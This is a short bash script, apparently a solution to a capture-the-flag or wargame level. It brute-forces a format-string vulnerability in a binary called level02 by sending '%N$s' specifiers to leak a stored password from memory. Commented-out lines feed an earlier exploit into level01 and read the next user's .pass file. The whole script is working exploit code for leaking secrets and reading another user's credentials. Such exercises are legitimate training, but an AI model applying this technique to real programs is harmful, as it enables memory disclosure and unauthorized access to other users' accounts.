#!/bin/bash

i="0"
username=""

while [ $i -lt 100 ] && [ ${#username} -ne 41 ]
do
    echo -e "%$i\$s\n+password" > /tmp/exploit02
    username=`cat /tmp/exploit02 | ~/level02 | grep "access\!" | cut -d' ' -f1`
    echo "%$i\$s: $username"
    i=$[$i+1]
    sleep 1
done

echo $username

# set -x
# (buildExploit; cat /tmp/exploit01 - | ~/level01) << EOI
#     echo "\nwhoami: \$(whoami)"
#     echo "Next pass is:  \$(cat /home/users/level02/.pass)"
# EOI